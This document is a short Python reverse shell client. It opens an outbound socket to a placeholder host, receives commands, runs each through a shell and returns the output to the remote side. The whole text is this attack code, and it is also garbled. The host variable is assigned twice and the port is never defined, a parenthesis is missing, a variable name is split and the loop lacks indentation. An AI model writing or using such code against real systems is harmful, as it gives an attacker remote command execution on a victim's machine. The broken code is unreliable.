# Python

import socket

import subprocess

​

REMOTE\_HOST = '10.X.X.X'

REMOTE\_HOST = 4231

​

client = socket.socket()

print ("Starting Connection..."

​

client.connect((REMOTE\_HOST, REMOTE \_PORT))

print ("Connected")

​

while True:

print ("Command Awaiting")

command = client.recv(1024)

command = command.decode()

op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

said = op.stdout.read()

error\_said = op.stderr.read()

print("Send Response")

client.send (said + error\_said)
